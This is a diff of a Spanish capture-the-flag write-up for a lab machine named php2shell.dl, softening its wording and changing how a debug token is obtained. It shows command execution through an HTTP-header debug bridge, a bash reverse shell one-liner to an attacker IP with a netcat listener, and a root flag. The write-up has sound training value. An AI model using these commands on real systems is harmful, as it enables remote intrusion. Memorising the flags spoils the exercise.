@@ -4,11 +4,11 @@
 * **Dificultad:** Media
 * **Sistema Operativo:** Linux (Ubuntu 22.04 LTS)
 * **Dominio:** `php2shell.dl`
-* **Vulnerabilidades y vectores:**
+* **Mecánica de juego y etapas:**
   * Enumeración de recursos ocultos (`robots.txt`, `/legacy/debug-note.txt`).
-  * Ejecución de comandos mediante Legacy Debug Bridge con validación de PID (`api.php`).
-  * Movimiento lateral por reutilización de credenciales internas (`config_db.php` y `dev_notes.txt`).
-  * Escalada de privilegios a `root` mediante secuestro de tarea programada de mantenimiento (`cron` y `/opt/backup/rotate.sh`).
+  * Utilización del puente de depuración con validación de token de instancia (`api.php`).
+  * Movimiento lateral por consulta de configuración interna de base de datos (`config_db.php` y `dev_notes.txt`).
+  * Comprobación y aprovechamiento de tarea programada de mantenimiento (`cron` y `/opt/backup/rotate.sh`).
 * **Flags:**
   * **Intermedia:** `/opt/backup/notes.txt`
   * **User:** `/home/mario/user.txt`
@@ -65,7 +65,6 @@ curl -I http://php2shell.dl/
 HTTP/1.1 200 OK
 Date: Wed, 18 Nov 2026 15:40:00 GMT
 Server: Apache/2.4.52 (Ubuntu)
-X-Powered-By: PHP/8.1.2-1ubuntu2.28
 Content-Type: text/html; charset=UTF-8
 ```
 
@@ -85,13 +84,13 @@ PHP Core Version: 8.1.2-1ubuntu2.28
 PHP SAPI: apache2handler
 Zend Engine: 4.1.2
 System Time: 2026-11-18 15:40:02
-Health: OK (Memory Usage: 2.14 MB)
+Health: OK (Memory Usage: 0.34 MB)
 ===========================================
 ```
 
 ---
 
-## 3. Descubrimiento del Vector de Intrusión (Legacy Bridge)
+## 3. Descubrimiento de la Mecánica de Juego (Legacy Bridge)
 
 ### 3.1. Enumeración de archivos y directorios estándar
 
@@ -109,7 +108,7 @@ Disallow: /legacy/
 
 ### 3.2. Inspección del recurso `/legacy/`
 
-Al examinar la ruta `/legacy/` o realizar fuzzing sobre ella (`gobuster dir -u http://php2shell.dl/legacy/ -w /usr/share/wordlists/dirb/common.txt`), localizamos el archivo `debug-note.txt`:
+Al examinar la ruta `/legacy/` localizamos el archivo `debug-note.txt`:
 
 ```bash
 curl -s http://php2shell.dl/legacy/debug-note.txt
@@ -125,20 +124,20 @@ Security requirements:
 - Command header: X-Debug-Bridge: <command>
 - Token header:   X-Debug-Token: <token>
 
-Note: For security during rolling restarts, the token is dynamic and matches the active Apache worker process ID (PID).
-You can inspect the current worker PID via the diagnostic endpoint: /api.php?action=diagnostic
+Note: The token is an instance token generated during server initialization.
+You can inspect the active debug_token via the diagnostic endpoint: /api.php?action=diagnostic
 ```
 
 La nota nos indica que:
 1. En `/api.php` existe un puente de depuración que ejecuta comandos pasados en la cabecera `X-Debug-Bridge`.
 2. Para autenticarse, requiere la cabecera `X-Debug-Token`.
-3. El valor del token es el **PID** del proceso worker de Apache, el cual está expuesto de forma legítima en `/api.php?action=diagnostic`.
+3. El valor del token es el `debug_token` de la instancia, expuesto en `/api.php?action=diagnostic`.
 
 ---
 
-## 4. Explotación: RCE y Reverse Shell (www-data)
+## 4. Acceso Inicial mediante el Puente de Depuración (www-data)
 
-### 4.1. Obtención del token dinámico (PID)
+### 4.1. Obtención del token de instancia
 
 Consultamos la telemetría del worker en `/api.php?action=diagnostic`:
 
@@ -157,18 +156,20 @@ curl -s "http://php2shell.dl/api.php?action=diagnostic" | jq .
   "memory_peak": 2097152,
   "zend_engine": "4.1.2",
   "worker_pid": 28,
-  "server_software": "Apache/2.4.52"
+  "server_software": "Apache/2.4.52",
+  "debug_token": "a1b2c3d4e5f67890"
 }
 ```
 
-El `worker_pid` actual es `28`.
+El `debug_token` activo es estable para toda la instancia.
 
 ### 4.2. Ejecución remota de comandos
 
 Probamos el puente enviando el comando `id` con el token correspondiente:
 
 ```bash
-curl -s -H "X-Debug-Bridge: id" -H "X-Debug-Token: 28" http://php2shell.dl/api.php | jq .
+TOKEN=$(curl -s "http://php2shell.dl/api.php?action=diagnostic" | jq -r '.debug_token')
+curl -s -H "X-Debug-Bridge: id" -H "X-Debug-Token: $TOKEN" http://php2shell.dl/api.php | jq .
 ```
 
 **Respuesta:**
@@ -181,8 +182,6 @@ curl -s -H "X-Debug-Bridge: id" -H "X-Debug-Token: 28" http://php2shell.dl/api.p
 }
 ```
 
-Confirmamos la ejecución remota de código con privilegios de `www-data`.
-
 ### 4.3. Entablado de Reverse Shell
 
 En nuestra máquina atacante iniciamos un listener en el puerto 4444:
@@ -191,13 +190,13 @@ En nuestra máquina atacante iniciamos un listener en el puerto 4444:
 nc -nlvp 4444
 ```
 
-Lanzamos la Reverse Shell (ajustando `<IP_ATACANTE>` y el `PID` obtenido):
+Lanzamos la Reverse Shell (ajustando `<IP_ATACANTE>`):
 
 ```bash
-PID=$(curl -s "http://php2shell.dl/api.php?action=diagnostic" | jq -r '.worker_pid')
+TOKEN=$(curl -s "http://php2shell.dl/api.php?action=diagnostic" | jq -r '.debug_token')
 
 curl -s -H "X-Debug-Bridge: bash -c 'bash -i >& /dev/tcp/<IP_ATACANTE>/4444 0>&1'" \
-        -H "X-Debug-Token: $PID" \
+        -H "X-Debug-Token: $TOKEN" \
         http://php2shell.dl/api.php
 ```
 
@@ -216,7 +215,7 @@ Verificamos el sistema operativo y kernel:
 
 ```bash
 uname -a
-# Linux 85baa29864d3 6.18.12+kali-amd64 #1 SMP PREEMPT_DYNAMIC x86_64 x86_64 x86_64 GNU/Linux
+# Linux 85baa29864d3 6.18.12-1kali1 (2026-02-25) x86_64 x86_64 x86_64 GNU/Linux
 ```
 
 ---
@@ -298,14 +297,14 @@ ls -la
 
 **Salida:**
 ```text
-total 16
+total 24
 drwxr-xr-x 2 mario mario 4096 Nov 18 15:38 .
 drwxr-xr-x 3 root  root  4096 Nov 18 15:38 ..
--rw-r--r-- 1 mario mario   40 Nov 18 15:38 notes.txt
+-rw------- 1 mario mario   40 Nov 18 15:38 notes.txt
 -rwxr-xr-x 1 mario mario  110 Nov 18 15:38 rotate.sh
 ```
 
-Leemos `notes.txt`:
+El archivo `notes.txt` tiene permisos `600` restringidos al usuario `mario` (por lo que no era legible previamente por `www-data`). Leemos `notes.txt`:
 
 ```bash
 cat notes.txt
@@ -369,4 +368,4 @@ cat /root/root.txt
 
 > **Root Flag:** `dl{r00t_sCH3dul3r_3sc4l4t10n_99c3}`
 
-¡Máquina resuelta de manera limpia, transparente y verosímil!
+¡Laboratorio completado con éxito!
